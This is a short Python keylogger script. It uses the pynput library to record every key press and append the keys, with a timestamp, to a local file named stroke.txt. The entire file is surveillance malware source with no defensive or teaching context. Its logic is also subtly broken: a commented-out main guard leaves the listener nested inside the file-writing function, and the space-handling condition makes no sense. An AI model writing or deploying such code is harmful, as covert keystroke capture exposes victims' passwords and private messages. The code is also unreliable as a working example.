from pynput.keyboard import Key, Listener

from datetime import datetime


count = 0
keys = []

with open("stroke.txt","a") as f:
    f.write("\nTimestamp"+str(datetime.now())[:-7]+":\n")


def on_press(key):
    global count, keys
    keys.append(key)
    write_file(keys)
    keys = []

def on_release(key):
    if key == Key.esc:
        pass
    
def write_file(keys):
    with open("stroke.txt","a") as f:
        for idx, key in enumerate(keys):
            k = str(key).replace("'","")
            if k.find("space") > 0 and k.find("backspace") == 1:
                f.write("  ")
            elif k.find("Key") == -1:
                f.write(k)

#if __name__ == '__main__':
    with Listener(
        on_press = on_press,
        on_release = on_release)as listener:
        listener.join()


    with open("stroke.txt","a") as f:
        f.write("\n\n")
        f.write("-------------------------------------------------------------------")
        f.write("\n\n")
